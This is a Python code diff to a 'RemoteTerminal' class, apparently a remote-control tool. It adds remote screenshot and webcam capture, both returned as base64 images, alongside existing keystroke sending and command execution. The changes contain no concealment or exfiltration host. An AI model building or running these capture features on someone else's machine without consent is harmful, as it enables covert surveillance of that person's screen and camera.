@@ -9,12 +9,12 @@ import pyautogui
 import asyncio
 import uuid
 import os
-
+import cv2
 
 class RemoteTerminal:
     def __init__(self):
         self.commands = [
-            'snapScreen', 'sendKeys'
+            'getScreen', 'sendKeys', 'getWebcam', 'cmdList'
         ]
 
 
@@ -39,13 +39,39 @@ class RemoteTerminal:
                     'content': out.stdout
                 }
 
-    # --- Screen Shot ---
-    def snapScreen(self, cmd) -> dict:
+    # --- Return all special commands ---
+    def cmdList(self, *args) -> dict:
+        cmds = ""
+        for cmd in self.commands:
+            cmds += f"{cmd}\n"
+        return {
+            'type': 'text',
+            'content': cmds
+        }
 
+
+    def conv64(self, img) -> str:
         img_file = BytesIO()
-        image = pyautogui.screenshot()
-        image.save(img_file, format='JPEG')
+        img.save(img_file, format='JPEG')
         img64 = base64.b64encode(img_file.getvalue())
+        return img64.decode('utf-8')
+        
+
+    # --- Screen Shot ---
+    def getScreen(self, *args) -> dict:
+
+        image = pyautogui.screenshot()
+        return {
+            'type': 'image',
+            'content': self.conv64(image)
+        }
+
+    # --- Webcam Snap ----
+    def getWebcam(self, *args) -> dict:
+        img = cv2.VideoCapture(0)
+        ret, frame = img.read()
+        retval, buffer = cv2.imencode('.jpg', frame)
+        img64 = base64.b64encode(buffer)
         return {
             'type': 'image',
             'content': img64.decode('utf-8')
@@ -65,6 +91,7 @@ class RemoteTerminal:
             'type': 'text',
             'content': "Done!"
         }
+
 
     # --- storing UUID ---
     def generate_uuid(self) -> str:
